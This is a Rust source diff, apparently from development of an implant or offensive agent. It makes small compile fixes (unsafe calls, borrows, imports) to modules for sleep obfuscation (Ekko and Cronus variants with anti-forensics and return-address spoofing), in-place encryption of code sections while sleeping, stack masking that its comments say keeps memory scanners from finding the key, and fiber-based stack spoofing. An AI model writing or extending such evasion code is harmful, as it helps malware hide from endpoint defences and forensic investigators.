@@ -193,7 +193,7 @@ pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Res
                 soc.spoof_return_address = true;
                 // Ekko/Foliage map to the Ekko variant (NtDelayExecution).
                 soc.variant = crate::sleep_obfuscation::SleepVariant::Ekko;
-                return crate::sleep_obfuscation::secure_sleep(soc);
+                return unsafe { crate::sleep_obfuscation::secure_sleep(&soc) };
             }
             #[cfg(not(target_arch = "x86_64"))]
             {
@@ -229,7 +229,7 @@ pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Res
                 soc.anti_forensics = true;
                 soc.spoof_return_address = true;
                 soc.variant = crate::sleep_obfuscation::SleepVariant::Cronus;
-                return crate::sleep_obfuscation::secure_sleep(soc);
+                return unsafe { crate::sleep_obfuscation::secure_sleep(&soc) };
             }
             #[cfg(not(target_arch = "x86_64"))]
             {
@@ -289,6 +289,8 @@ pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Res
 }
 
 pub mod crypto {
+    use super::*;
+
     use chacha20poly1305::{
         aead::{Aead, KeyInit, OsRng},
         XChaCha20Poly1305, XNonce,
@@ -709,7 +711,7 @@ pub mod crypto {
                     let nonce = XNonce::from_slice(&nonce_bytes);
                     let plaintext = std::slice::from_raw_parts(addr, size);
                     // AEAD encrypt produces ciphertext + 16-byte tag.
-                    let ct_and_tag = cipher.encrypt(nonce, plaintext)
+                    let mut ct_and_tag = cipher.encrypt(nonce, plaintext)
                         .expect("XChaCha20-Poly1305 encryption failed");
                     // Copy ciphertext (without tag) back to the section in-place.
                     std::ptr::copy_nonoverlapping(
@@ -903,7 +905,7 @@ pub mod crypto {
                     let nonce = XNonce::from_slice(&nonce_bytes);
                     let plaintext = std::slice::from_raw_parts(addr, size);
                     // AEAD encrypt produces ciphertext + 16-byte tag.
-                    let ct_and_tag = cipher.encrypt(nonce, plaintext)
+                    let mut ct_and_tag = cipher.encrypt(nonce, plaintext)
                         .expect("XChaCha20-Poly1305 encryption failed");
                     // Copy ciphertext (without tag) back to the section in-place.
                     std::ptr::copy_nonoverlapping(
@@ -1049,6 +1051,9 @@ pub mod crypto {
 /// `Vec<SectionEntry>`).  This prevents memory-scanning tools from locating
 /// the key via known global or thread-local offsets.
 pub mod stack_mask {
+    #[cfg(windows)]
+    use super::{PAGE_NOACCESS, PAGE_READWRITE};
+
     use chacha20::ChaCha20;
     use chacha20::cipher::{KeyIvInit, StreamCipher};
     use rand::RngCore;
@@ -1223,6 +1228,8 @@ pub mod stack_mask {
 }
 
 pub mod spoof {
+    use super::*;
+
     // Thread-local state for fiber-based stack spoofing.
     thread_local! {
         pub(super) static MAIN_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
